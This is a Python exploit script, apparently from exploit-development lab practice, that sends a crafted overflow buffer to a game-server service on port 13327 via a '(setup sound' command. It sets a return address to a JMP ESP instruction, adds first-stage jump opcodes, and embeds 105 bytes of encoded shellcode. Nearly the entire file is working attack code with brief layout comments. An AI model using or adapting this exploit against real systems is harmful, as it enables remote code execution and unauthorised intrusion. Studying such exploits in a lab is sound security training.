#!/usr/bin/python
#
# NOTE:
import socket

host = "127.0.0.1"

# 4368 = front pad | ret = bytes in EIP | "\x83\xC0\x0C\xFF\xE0" = First Stage Shellcode Opcodes | 2 = NOP tail pad
# address of 1st JMP ESP instruction: 0x08134596
# ret now contains the address to a JMP ESP instruction
ret = "\x96\x45\x13\x08"

# 105 bytes long
shellcode = ("\xb8\xea\xfe\x16\x3b\xda\xc1\xd9\x74\x24\xf4\x5f\x29\xc9\xb1"
"\x14\x83\xc7\x04\x31\x47\x10\x03\x47\x10\x08\x0b\x27\xe0\x3b"
"\x17\x1b\x55\x90\xb2\x9e\xd0\xf7\xf3\xf9\x2f\x77\xa8\x5b\xe2"
"\x1f\x4d\x64\x03\x64\x3b\x74\x52\xca\x35\x95\x3e\x8c\x1d\x9b"
"\x3f\xd9\xdf\x27\xf3\xdd\x6f\x41\x3e\x5d\xcc\x3e\xa6\x90\x53"
"\xad\x7e\x40\x6b\x8a\x4d\x14\xda\x53\xb6\x7c\xf2\x8c\x35\x14"
"\x64\xfc\xdb\x8d\x1a\x8b\xff\x1d\xb0\x02\x1e\x2d\x3d\xd8\x61")

crash = shellcode + "\x41"*(4368-105) + ret + "\x83\xC0\x0C\xFF\xE0" + "\x90"*2

# \x90\x00# = bytes that terminate the buffer
buffer = "\x11(setup sound " + crash + "\x90\x00#"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print("[*] Sending evil buffer...")
s.connect((host, 13327))
s.send(buffer)
data = s.recv(1024)
print(data)
s.close()
print("[*] Payload sent")
